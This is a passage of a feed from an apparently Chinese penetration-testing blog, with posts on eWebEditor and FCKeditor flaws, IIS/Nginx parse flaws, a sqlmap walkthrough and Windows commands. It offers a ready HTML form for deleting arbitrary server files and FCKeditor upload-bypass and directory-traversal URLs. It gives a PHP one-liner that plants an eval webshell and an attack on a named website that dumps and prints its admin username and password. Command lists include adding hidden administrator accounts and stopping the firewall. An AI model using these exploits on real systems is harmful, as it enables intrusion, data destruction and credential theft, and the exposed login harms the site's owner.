GetSafeStr(Request.Form(“d_savepathfilename”))<br>…<br>oRs(“D_SavePathFileName”) = sSavePathFileName<br>居然过滤了，是GetSafeStr函数，再看看这个函数，在Startup.asp里：<br>Function GetSafeStr(str)<br>GetSafeStr = Replace(Replace(Replace(Trim(str), “‘”, “”), Chr(34), “”), “;”, “”)<br>End Function<br>无语，这不是过滤字符型注入的函数么？放这里什么用也没有啊！既然路径没有过滤，那就可以直接定义了，构造一个提交页面，其中d_savepathfilename自己任意赋值(要删除多个文件，用|隔开即可)。试试../../eWebEditor.asp，提交后删除该新闻，于是主目录下的eWebEditor.asp不见了！<br>下面给出利用的htm：<br>    <code>&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;eWebEditor删除文件 by:oldjun(http://www.oldjun.com)&lt;/TITLE&gt;    &lt;style&gt;body,p,td,input {font-size:9pt}&lt;/style&gt;    &lt;/HEAD&gt;&lt;BODY&gt;&lt;a href=’list.asp’&gt;新闻列表&lt;/a&gt; | &lt;a href=’add.asp’&gt;增加新闻&lt;/a&gt;    &lt;b&gt;增加新闻&lt;/b&gt;    &lt;form action=”http://127.0.0.1/editor/Example/NewsSystem/addsave.asp”    method=”post” name=”myform”&gt;    &lt;input type=hidden name=d_originalfilename&gt;    &lt;input type=hidden name=d_savefilename&gt;    &lt;table cellspacing=3 align=center&gt;    &lt;tr&gt;&lt;td&gt;要删的文件(相对路径就可以了)：&lt;/td&gt;    &lt;td&gt;&lt;input type=”text” name=”d_savepathfilename” value=”” size=”90″&gt;&lt;/td&gt;    &lt;/tr&gt;    &lt;tr&gt;&lt;td&gt;新闻标题(随便填)：&lt;/td&gt;    &lt;td&gt;&lt;input type=”text” name=”d_title” value=”” size=”90″&gt;&lt;/td&gt;    &lt;/tr&gt;    &lt;tr&gt;&lt;td&gt;标题图片：&lt;/td&gt;    &lt;td&gt;&lt;select name=”d_picture” size=1&gt;&lt;option value=”&gt;无&lt;/    option&gt;&lt;/select&gt;    当编辑区有插入图片时，将自动填充此下拉框&lt;/td&gt;    &lt;/tr&gt;    &lt;tr&gt;&lt;td&gt;新闻内容(随便填)：&lt;/td&gt;    &lt;td&gt;&lt;textarea name=”d_content”&gt;&lt;/textarea&gt;&lt;/td&gt;    &lt;/tr&gt;    &lt;/table&gt;    &lt;input type=submit name=btnSubmit value=” 提 交 “&gt;    &lt;input type=reset name=btnReset value=” 重 填 “&gt;    &lt;/form&gt;    &lt;/BODY&gt;&lt;/HTML&gt;</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;##1:默认管理后台:&lt;br&gt;&lt;a href=&quot;http://127.0.0.1/ewebeditor/admin_login.asp&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://127.0.0.1/ewebeditor/admin_login.asp&lt;/a&gt;&lt;br&gt;后台如果能进入:&lt;br&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://budebao.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>fck文件编辑器漏洞</title>
    <link href="http://budebao.github.io/2018/03/21/fck%E6%96%87%E4%BB%B6%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/"/>
    <id>http://budebao.github.io/2018/03/21/fck文件编辑器漏洞/</id>
    <published>2018-03-21T12:05:33.758Z</published>
    <updated>2018-04-11T12:43:44.815Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-查看编辑器版本"><a href="#1-查看编辑器版本" class="headerlink" title="1.查看编辑器版本"></a>1.查看编辑器版本</h2><p>FCKeditor/_whatsnew.html<br>—————————————————————————————————————————————————————————————<br><a id="more"></a></p><h2 id="2-Version-2-2-版本"><a href="#2-Version-2-2-版本" class="headerlink" title="2. Version 2.2 版本"></a>2. Version 2.2 版本</h2><p>Apache+linux 环境下在上传文件后面加个.突破！测试通过。<br>—————————————————————————————————————————————————————————————</p><h2 id="3-Version-lt-2-4-2-For-php-在处理PHP-上传的地方并未对Media-类型进行上传文件类型的控制，导致用户上传任意文件！将以下保存为html文件，修改action地址。"><a href="#3-Version-lt-2-4-2-For-php-在处理PHP-上传的地方并未对Media-类型进行上传文件类型的控制，导致用户上传任意文件！将以下保存为html文件，修改action地址。" class="headerlink" title="3.Version &lt;=2.4.2 For php 在处理PHP 上传的地方并未对Media 类型进行上传文件类型的控制，导致用户上传任意文件！将以下保存为html文件，修改action地址。"></a>3.Version &lt;=2.4.2 For php 在处理PHP 上传的地方并未对Media 类型进行上传文件类型的控制，导致用户上传任意文件！将以下保存为html文件，修改action地址。</h2><pre><code>`&lt;form id=&quot;frmUpload&quot; enctype=&quot;multipart/form-data&quot;action=&quot;http://www.site.com/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media&quot; method=&quot;post&quot;&gt;Upload a new file:&lt;br&gt;&lt;input type=&quot;file&quot; name=&quot;NewFile&quot; size=&quot;50&quot;&gt;&lt;br&gt;&lt;input id=&quot;btnUpload&quot; type=&quot;submit&quot; value=&quot;Upload&quot;&gt;&lt;/form&gt;`</code></pre><p>—————————————————————————————————————————————————————————————</p><h2 id="4-FCKeditor-文件上传“-”变“-”下划线的绕过方法"><a href="#4-FCKeditor-文件上传“-”变“-”下划线的绕过方法" class="headerlink" title="4.FCKeditor 文件上传“.”变“_”下划线的绕过方法"></a>4.FCKeditor 文件上传“.”变“_”下划线的绕过方法</h2><pre><code>很多时候上传的文件例如：shell.php.rar 或shell.php;.jpg 会变为shell_php;.jpg 这是新版FCK 的变化。</code></pre><h2 id="4-1：提交shell-php-空格绕过"><a href="#4-1：提交shell-php-空格绕过" class="headerlink" title="4.1：提交shell.php+空格绕过"></a>4.1：提交shell.php+空格绕过</h2><p>不过空格只支持win 系统 *nix 是不支持的[shell.php 和shell.php+空格是2 个不同的文件 未测试。</p><h2 id="4-2：继续上传同名文件可变为shell-php-1-jpg-也可以新建一个文件夹，只检测了第一级的目录，如果跳到二级目录就不受限制。"><a href="#4-2：继续上传同名文件可变为shell-php-1-jpg-也可以新建一个文件夹，只检测了第一级的目录，如果跳到二级目录就不受限制。" class="headerlink" title="4.2：继续上传同名文件可变为shell.php;(1).jpg 也可以新建一个文件夹，只检测了第一级的目录，如果跳到二级目录就不受限制。"></a>4.2：继续上传同名文件可变为shell.php;(1).jpg 也可以新建一个文件夹，只检测了第一级的目录，如果跳到二级目录就不受限制。</h2><p>—————————————————————————————————————————————————————————————</p><h2 id="5-突破建立文件夹"><a href="#5-突破建立文件夹" class="headerlink" title="5. 突破建立文件夹"></a>5. 突破建立文件夹</h2><p>FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=%2Fshell.asp&amp;NewFolderName=z&amp;uuid=1244789975684<br>FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&amp;CurrentFolder=/&amp;Type=Image&amp;NewFolderName=shell.asp<br>—————————————————————————————————————————————————————————————</p><h2 id="6-FCKeditor-中test-文件的上传地址"><a href="#6-FCKeditor-中test-文件的上传地址" class="headerlink" title="6. FCKeditor 中test 文件的上传地址"></a>6. FCKeditor 中test 文件的上传地址</h2><p>FCKeditor/editor/filemanager/browser/default/connectors/test.html<br>FCKeditor/editor/filemanager/upload/test.html<br>FCKeditor/editor/filemanager/connectors/test.html<br>FCKeditor/editor/filemanager/connectors/uploadtest.html<br>—————————————————————————————————————————————————————————————</p><h2 id="7-常用上传地址"><a href="#7-常用上传地址" class="headerlink" title="7.常用上传地址"></a>7.常用上传地址</h2><p>FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/<br>FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp<br>FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=<a href="http://www.site.com%2Ffckeditor%2Feditor%2Ffilemanager%2Fconnectors%2Fphp%2Fconnector.php" target="_blank" rel="noopener">http://www.site.com%2Ffckeditor%2Feditor%2Ffilemanager%2Fconnectors%2Fphp%2Fconnector.php</a> (ver:2.6.3 测试通过)<br>JSP 版：<br>FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector.jsp<br>注意红色部分修改为FCKeditor 实际使用的脚本语言，蓝色部分可以自定义文<br>件夹名称也可以利用../..目录遍历，紫色部分为实际网站地址。<br>—————————————————————————————————————————————————————————————</p><h2 id="8-其他上传地址"><a href="#8-其他上传地址" class="headerlink" title="8.其他上传地址"></a>8.其他上传地址</h2><p>FCKeditor/_samples/default.html<br>FCKeditor/_samples/asp/sample01.asp<br>FCKeditor/_samples/asp/sample02.asp<br>FCKeditor/_samples/asp/sample03.asp<br>FCKeditor/_samples/asp/sample04.asp<br>一般很多站点都已删除_samples 目录，可以试试。<br>FCKeditor/editor/fckeditor.html 不可以上传文件，可以点击上传图片按钮再选择浏览服务器即可跳转至可上传文件页。<br>—————————————————————————————————————————————————————————————</p><h2 id="9-列目录漏洞也可助找上传地址"><a href="#9-列目录漏洞也可助找上传地址" class="headerlink" title="9.列目录漏洞也可助找上传地址"></a>9.列目录漏洞也可助找上传地址</h2><p>Version 2.4.1 测试通过<br>修改CurrentFolder 参数使用 ../../来进入不同的目录<br>/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=../../..%2F&amp;NewFolderName=shell.asp<br>根据返回的XML 信息可以查看网站所有的目录。<br>FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=%2F<br>也可以直接浏览盘符：<br>JSP 版本：<br>FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&amp;Type=&amp;CurrentFolder=%2F<br>—————————————————————————————————————————————————————————————</p><h2 id="10-爆路径漏洞"><a href="#10-爆路径漏洞" class="headerlink" title="10.爆路径漏洞"></a>10.爆路径漏洞</h2><p>FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=/shell.asp<br>—————————————————————————————————————————————————————————————</p><h2 id="11-FCKeditor-被动限制策略所导致的过滤不严问题"><a href="#11-FCKeditor-被动限制策略所导致的过滤不严问题" class="headerlink" title="11. FCKeditor 被动限制策略所导致的过滤不严问题"></a>11. FCKeditor 被动限制策略所导致的过滤不严问题</h2><p> 影响版本: FCKeditor x.x &lt;= FCKeditor v2.4.3<br>脆弱描述：<br>FCKeditor v2.4.3 中File 类别默认拒绝上传类型：<br>html|htm|php|php2|php3|php4|php5|phtml|pwml|inc|asp|aspx|ascx|jsp|cfm|cfc|pl|bat|exe|com|dll|vbs|js|reg|cgi|htaccess|asis|sh|shtml|shtm|phtm<br>Fckeditor 2.0 &lt;= 2.2 允许上传asa、cer、php2、php4、inc、pwml、pht 后缀的文件上传后它保存的文件直接用的$sFilePath = $sServerDir . $sFileName，而没有使用$sExtension 为后缀.直接导致在win 下在上传文件后面加个.来突破[未测试]!<br>        而在apache 下，因为”Apache 文件名解析缺陷漏洞”也可以利用之，另建议其他上传漏洞中定义TYPE 变量时使用File 类别来上传文件,根据FCKeditor 的代码，其限制最为狭隘。<br>        在上传时遇见可直接上传脚本文件固然很好，但有些版本可能无法直接上传可以利用在文件名后面加.点或空格绕过，也可以利用2003 解析漏洞建立xxx.asp文件夹或者上传xx.asp;.jpg!<br>———————————————————————————————————————————————————</p><h2 id="FCK编辑器jsp版本漏洞："><a href="#FCK编辑器jsp版本漏洞：" class="headerlink" title="FCK编辑器jsp版本漏洞："></a>FCK编辑器jsp版本漏洞：</h2><p><a href="http://www.xxx.com/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&amp;Type=Image&amp;CurrentFolder=%2F" target="_blank" rel="noopener">http://www.xxx.com/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&amp;Type=Image&amp;CurrentFolder=%2F</a></p><p>上传马所在目录<br>FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/<br>上传shell的地址:<br><a href="http://www.xxx.com/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector" target="_blank" rel="noopener">http://www.xxx.com/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector</a><br>跟版本有关系.并不是百分百成功. 测试成功几个站.<br>不能通杀.很遗憾.<br><a href="http://www.****.com/FCKeditor/editor/filemanager/browser/default/browser.html?type=File&amp;connector=connectors/jsp/connector" target="_blank" rel="noopener">http://www.****.com/FCKeditor/editor/filemanager/browser/default/browser.html?type=File&amp;connector=connectors/jsp/connector</a><br>如果以上地址不行可以试试<br>FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=/servlet/Connector<br>FCKeditor/_samples/<br>FCKeditor/_samples/default.html<br>FCKeditor/editor/fckeditor.htm<br>FCKeditor/editor/fckdialog.html</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-查看编辑器版本&quot;&gt;&lt;a href=&quot;#1-查看编辑器版本&quot; class=&quot;headerlink&quot; title=&quot;1.查看编辑器版本&quot;&gt;&lt;/a&gt;1.查看编辑器版本&lt;/h2&gt;&lt;p&gt;FCKeditor/_whatsnew.html&lt;br&gt;—————————————————————————————————————————————————————————————&lt;br&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://budebao.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>windows常用dos命令，运行命令及快捷键</title>
    <link href="http://budebao.github.io/2018/03/21/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
    <id>http://budebao.github.io/2018/03/21/文件解析漏洞/</id>
    <published>2018-03-21T11:51:01.126Z</published>
    <updated>2018-03-21T11:55:55.947Z</updated>
    
    <content type="html"><![CDATA[<p>##1：IIS6.0解析漏洞</p><p>目录解析漏洞，在以.asp结尾的目录下的文件都会被当作asp文件来执行，比如上传了1.jpg的文件到upload.asp目录下，那么1.jpg文件就会被当作asp文件来执行。<br><a id="more"></a><br>文件名解析漏洞，IIS6.0从左向右解析文件名，遇到分号就会自动终止解析，所以上传形如1.asp;.jpg的文件就被当作1.asp文件来执行。</p><p>##2：IIS7.0，7.5和Nginx&lt;8.03畸形解析漏洞（写webshell漏洞）</p><p>原理：在上传文件所在目录下创建一个一句话木马文件</p><p>实现过程：新建一个1.txt文件，内容为&lt;?php fputs(fopen(‘shell.php’,’w’),’&lt;?php @eval($_POST[test])?&gt;’)?&gt;，将文件保存成1.jpg格式，上传到服务器，假设上传路径为/upload，</p><p>上传成功后，直接访问/upload/1.jpg，此时神奇的畸形解析开始发挥作用啦，我们会神奇的发现/upload目录下创建了一个一句话木马文件shell.php，，，，，，，，，</p><p>##3：空字节代码绕过漏洞，也叫神奇的00截断，此处的00指的是16进制的00</p><p>文件名00截断：直接上实现过程，，，</p><p>1）第一种方法：上传文件名为1.php.jpg格式的图马文件，抓包后，在php后面加上一个空格字符，然后到hex中将php后面的空格字符对应的20改为00后放行即可。</p><p>2）第二种方法：上传文件名为1.php%00.jpg格式的图马文件，抓包后，将%00进行url解码后放行即可。</p><p>请求包中包含上传路径的，可以尝试在路径后面加个脚本文件名，然后进行00截断，原理都一样，话不多说，直接上实现过程，，，，</p><p>实现过程：上传路径/upload/，直接改成/upload/.php%00，再将%00进行url解码后放行即可。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;##1：IIS6.0解析漏洞&lt;/p&gt;
&lt;p&gt;目录解析漏洞，在以.asp结尾的目录下的文件都会被当作asp文件来执行，比如上传了1.jpg的文件到upload.asp目录下，那么1.jpg文件就会被当作asp文件来执行。&lt;br&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://budebao.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入，sqlmap实战</title>
    <link href="http://budebao.github.io/2018/03/13/SQL%E6%B3%A8%E5%85%A5%EF%BC%8Csqlmap%E5%AE%9E%E6%88%98/"/>
    <id>http://budebao.github.io/2018/03/13/SQL注入，sqlmap实战/</id>
    <published>2018-03-13T15:03:27.146Z</published>
    <updated>2018-03-14T04:06:06.713Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-首先判断改url是否存在注入，如有则返回数据库类型及版本信息，web容器，服务器信息"><a href="#1-首先判断改url是否存在注入，如有则返回数据库类型及版本信息，web容器，服务器信息" class="headerlink" title="1.首先判断改url是否存在注入，如有则返回数据库类型及版本信息，web容器，服务器信息"></a>1.首先判断改url是否存在注入，如有则返回数据库类型及版本信息，web容器，服务器信息</h2><p>   命令：sqlmap.py -u “<a href="http://www.jbpower.cn/news_xx.asp?News_id=204" target="_blank" rel="noopener">http://www.jbpower.cn/news_xx.asp?News_id=204</a>“<br>   <a id="more"></a><br>   <img src="https://i.imgur.com/HgBRlE9.png" alt=""><br>   服务器信息:windows 2008<br>   web脚本语言:asp<br>   数据库类型:access<br>   由于数据库是access，所以只需要查找表</p><h2 id="2-接下来获取数据库表"><a href="#2-接下来获取数据库表" class="headerlink" title="2.接下来获取数据库表"></a>2.接下来获取数据库表</h2><p>   命令：<a href="http://www.jbpower.cn/news_xx.asp?News_id=204" target="_blank" rel="noopener">http://www.jbpower.cn/news_xx.asp?News_id=204</a>“ –tables<br>   <img src="https://i.imgur.com/SacCOw9.png" alt=""><br>   由此，读取了admin表</p><h2 id="3-然后，获取admin表中所有字段名称"><a href="#3-然后，获取admin表中所有字段名称" class="headerlink" title="3.然后，获取admin表中所有字段名称"></a>3.然后，获取admin表中所有字段名称</h2><p>   命令：sqlmap.py -u “<a href="http://www.jbpower.cn/news_xx.asp?News_id=204" target="_blank" rel="noopener">http://www.jbpower.cn/news_xx.asp?News_id=204</a>“ –columns -T “admin”<br>   <img src="https://i.imgur.com/haUU5hG.png" alt=""><br>   于是，得到了存储用户名和密码的字段admin_name和admin_pwd;</p><h2 id="4-最后，获取admin-name和admin-pwd字段内容"><a href="#4-最后，获取admin-name和admin-pwd字段内容" class="headerlink" title="4.最后，获取admin_name和admin_pwd字段内容"></a>4.最后，获取admin_name和admin_pwd字段内容</h2><p>   命令：sqlmap.py -u “<a href="http://www.jbpower.cn/news_xx.asp?News_id=204" target="_blank" rel="noopener">http://www.jbpower.cn/news_xx.asp?News_id=204</a>“ –dump -C “admin_name,admin_pwd” -T “admin”<br>   <img src="https://i.imgur.com/4nO17EZ.png" alt=""><br>   最终，我们得到了后台的帐号和密码<br>   帐号:jbpower密码:3278121 </p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-首先判断改url是否存在注入，如有则返回数据库类型及版本信息，web容器，服务器信息&quot;&gt;&lt;a href=&quot;#1-首先判断改url是否存在注入，如有则返回数据库类型及版本信息，web容器，服务器信息&quot; class=&quot;headerlink&quot; title=&quot;1.首先判断改url是否存在注入，如有则返回数据库类型及版本信息，web容器，服务器信息&quot;&gt;&lt;/a&gt;1.首先判断改url是否存在注入，如有则返回数据库类型及版本信息，web容器，服务器信息&lt;/h2&gt;&lt;p&gt;   命令：sqlmap.py -u “&lt;a href=&quot;http://www.jbpower.cn/news_xx.asp?News_id=204&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.jbpower.cn/news_xx.asp?News_id=204&lt;/a&gt;“&lt;br&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://budebao.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>windows常用dos命令，运行命令及快捷键</title>
    <link href="http://budebao.github.io/2018/03/13/windows%E5%B8%B8%E7%94%A8dos%E5%91%BD%E4%BB%A4%EF%BC%8C%E8%BF%90%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%BF%AB%E6%8D%B7%E9%94%AE%20/"/>
    <id>http://budebao.github.io/2018/03/13/windows常用dos命令，运行命令及快捷键 /</id>
    <published>2018-03-13T14:28:45.216Z</published>
    <updated>2018-03-13T16:37:39.281Z</updated>
    
    <content type="html"><![CDATA[<h2 id="windows常用dos命令"><a href="#windows常用dos命令" class="headerlink" title="windows常用dos命令"></a>windows常用dos命令</h2><p>*ipconfig 查看ip</p><p>*ipconfig/release 释放ip</p><p><em>ipconfig/renew 重新获得ip<br> <a id="more"></a></em>ping -t -l 65500 ip 死亡之ping</p><p>*color 改变dos界面颜色（后加？查看参数）</p><p>*systeminfo 查看当前系统信息</p><p>*shutdown -s -t 180 -c“你被黑了”（-s关闭 -t 重启 -t时间 -c描述 shutdown -a取消）</p><p>*dir 查看目录</p><p>*cd 切换目录</p><p>*start www.baidu.com 打开网站</p><p>*start 1.txt 打开1.txt文件</p><p>*conpy con c：\2.txt 在c盘创建一个txt文件</p><p>*md 目录名 创建目录</p><p>*rd 文件夹名 删除文件夹</p><p>*ren 原文件名 新文件名 重命名</p><p>*del 删除文件</p><p>*copy 复制文件</p><p>*move 移动文件</p><p>*tree 树形列出文件夹结构</p><p>*telnet 远程登录</p><p>*net start 查看开启的目录</p><p>*net start 服务名 开启服务</p><p>*net stop 服务名 停止服务</p><p>*arp -a 查看局域网内网络状况</p><p>*net view 查看局域网内其他计算机名称</p><p>*net user exehack exehack /add 添加用户</p><p>*net localgroup administrators hackey /add 将hackey提升为管理员</p><p>*net user hackey /del 删除hackey</p><p>*net user guest /active:yes 激活GUEST用户</p><p>*net stop sharedaccess 停XP自带防火墙</p><p>*net start telnet 开TELNET服务</p><p>*tftp -i 目标IP get 文件名 存放地址(目标主机) TFTP上传命令</p><p>*net use ipipc$ ” ” /user:” ” 建立IPC空链接</p><p>*net use ipipc$ “密码” /user:”用户名” 建立IPC非空链接</p><p>*net use h: ipc$ “密码” /user:”用户名” 直接登陆后映射对方C：到本地为H:</p><p>*net use h: ipc$ 登陆后映射对方C：到本地为H:</p><p>*net use ipipc$ /del 删除IPC链接</p><p>*net use h: /del 删除映射对方到本地的为H:的映射</p><p>*net password 密码 更改系统登陆密码</p><p>*netstat -a 查看开启了哪些端口,常用netstat -an</p><p>*netstat -n 查看端口的网络连接情况，常用netstat -an</p><p>*netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况）</p><p>*nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写</p><p>*tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。</p><h2 id="windows常用快捷键"><a href="#windows常用快捷键" class="headerlink" title="windows常用快捷键"></a>windows常用快捷键</h2><p>*F1　显示当前程序或者windows的帮助内容。</p><p>*F2　当你选中一个文件的话，这意味着“重命名”</p><p>*F3　当你在桌面上的时候是打开“查找：所有文件” 对话框</p><p>*F10或ALT　　激活当前程序的菜单栏</p><p>*windows键或CTRL ESC　打开开始菜单</p><p>*CTRL ALT DELETE　在win9x中打开关闭程序对话框</p><p>*DELETE　删除被选择的选择项目，如果是文件，将被放入回收站</p><p>*SHIFT DELETE　删除被选择的选择项目，如果是文件，将被直接删除而不是放入回收站</p><p>*CTRL N　　　　新建一个新的文件</p><p>*CTRL O　　　　打开“打开文件”对话框</p><p>*CTRL P　　　　打开“打印”对话框</p><p>*CTRL S　　　　保存当前操作的文件</p><p>*CTRL X　　　　剪切被选择的项目到剪贴板</p><p>*CTRL INSERT 或 CTRL C　 复制被选择的项目到剪贴板</p><p>*SHIFT INSERT 或 CTRL V　粘贴剪贴板中的项目</p><p>*ALT BACKSPACE 或 CTRL Z 撤销上一步的操作</p><p>*ALT SHIFT BACKSPACE　　 重做上一步被撤销的操作</p><p>*Windows键 M　　 最小化所有被打开的窗口</p><p>*Windows键 CTRL M　　　重新将恢复上一项操作前窗口的大小和位置</p><p>*Windows键 E　　　　　　 打开资源管理器</p><p>*Windows键 F　　　　　　 打开“查找：所有文件”对话框</p><p>*Windows键 R　　　　　　 打开“运行”对话框</p><p>*Windows键 BREAK　　　　 打开“系统属性”对话框</p><p>*Windows键 CTRL F　　　　打开“查找：计算机”对话框</p><p>*ALT F4　　　　　　　　　关闭当前应用程序</p><p>*ALT SPACEBAR　　　　　打开程序最左上角的菜单</p><p>*ALT TAB　　　　　　　　 切换当前程序</p><p>*ALT ESC　　　　　　　　 切换当前程序</p><p>*ALT ENTER　　　　　　　 将windows下运行的MSDOS窗口在窗口和全屏幕状态间切换</p><h2 id="windows运行命令"><a href="#windows运行命令" class="headerlink" title="windows运行命令"></a>windows运行命令</h2><p>*winver———检查Windows版本</p><p>*wmimgmt.msc—-打开windows管理体系结构</p><p>*wupdmgr——–windows更新程序</p><p>*winver———检查Windows版本</p><p>*wmimgmt.msc—-打开windows管理体系结构</p><p>*wupdmgr——–windows更新程序</p><p>*wscript——–windows脚本宿主设置</p><p>*write———-写字板</p><p>*winmsd—–系统信息</p><p>*wiaacmgr——-扫描仪和照相机向导</p><p>*winchat——–XP自带局域网聊天</p><p>*mem.exe——–显示内存使用情况</p><p>*Msconfig.exe—系统配置实用程序</p><p>*mplayer2——-简易widnows media player</p><p>*mspaint——–画图板</p><p>*mstsc———-远程桌面连接</p><p>*player2——-媒体播放机</p><p>*magnify——–放大镜实用程序</p><p>*mmc————打开控制台</p><p>*mobsync——–同步命令</p><p>*dxdiag———检查DirectX信息</p><p>*drwtsn32—— 系统医生</p><p>*devmgmt.msc— 设备管理器</p><p>*dfrg.msc——-磁盘碎片整理程序</p><p>*diskmgmt.msc—磁盘管理实用程序</p><p>*dcomcnfg——-打开系统组件服务</p><p>*ddeshare——-打开DDE共享设置</p><p>*dvdplay——–DVD播放器</p><p>*net stop messenger—–停止信使服务</p><p>*net start messenger—-开始信使服务</p><p>*notepad——–打开记事本</p><p>*nslookup——-网络管理的工具向导</p><p>*ntbackup——-系统备份和还原</p><p>*narrator——-屏幕”讲述人”</p><p>*ntmsmgr.msc—-移动存储管理器</p><p>*ntmsoprq.msc—移动存储管理员操作请求</p><p>*netstat -an—-(TC)命令检查接口</p><p>*syncapp——–创建一个公文包</p><p>*sysedit——–系统配置编辑器</p><p>*sigverif——-文件签名验证程序</p><p>*sndrec32——-录音机</p><p>*shrpubw——–创建共享文件夹</p><p>*secpol.msc—–本地安全策略</p><p>*syskey———系统加密，一旦加密就不能解开，保护windows xp系统的双重密码</p><p>*services.msc—本地服务设置</p><p>*Sndvol32——-音量控制程序</p><p>*sfc.exe——–系统文件检查器</p><p>*sfc /scannow—windows文件保护</p><p>*Nslookup——-60秒倒计时关机命令</p><p>*tourstart——xp简介（安装完成后出现的漫游xp程序）</p><p>*taskmgr——–任务管理器</p><p>*eventvwr——-事件查看器</p><p>*eudcedit——-造字程序</p><p>*explorer——-打开资源管理器</p><p>*packager——-对象包装程序</p><p>*perfmon.msc—-计算机性能监测程序</p><p>*progman——–程序管理器</p><p>*regedit.exe—-注册表</p><p>*rsop.msc——-组策略结果集</p><p>*regedt32——-注册表编辑器</p><p>*rononce -p —-15秒关机</p><p>regsvr32 /u .dll—-停止dll文件运行</p><p>*regsvr32 /u zipfldr.dll——取消ZIP支持</p><p>*cmd.exe——–CMD命令提示符</p><p>*chkdsk.exe—–Chkdsk磁盘检查</p><p>*certmgr.msc—-证书管理实用程序</p><p>*calc———–启动计算器</p><p>*charmap——–启动字符映射表</p><p>*cliconfg——-SQL SERVER 客户端网络实用程序</p><p>*Clipbrd——–剪贴板查看器</p><p>*conf———–启动netmeeting</p><p>*compmgmt.msc—计算机管理</p><p>cleanmgr——-*整理</p><p>*ciadv.msc——索引服务程序</p><p>*osk————打开屏幕键盘</p><p>*odbcad32——-ODBC数据源管理器</p><p>*oobe/msoobe /a—-检查XP是否激活</p><p>*lusrmgr.msc—-本机用户和组</p><p>*logoff———注销命令</p><p>*iexpress——-木马捆绑工具，系统自带</p><p>*Nslookup——-IP地址侦测器</p><p>*fsmgmt.msc—–共享文件夹管理器</p><p>*utilman——–辅助工具管理器</p><p>*gpedit.msc—–组策略</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;windows常用dos命令&quot;&gt;&lt;a href=&quot;#windows常用dos命令&quot; class=&quot;headerlink&quot; title=&quot;windows常用dos命令&quot;&gt;&lt;/a&gt;windows常用dos命令&lt;/h2&gt;&lt;p&gt;*ipconfig 查看ip&lt;/p&gt;
&lt;p&gt;*ipconfig/release 释放ip&lt;/p&gt;
&lt;p&gt;&lt;em&gt;ipconfig/renew 重新获得ip&lt;br&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://budebao.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
</feed>
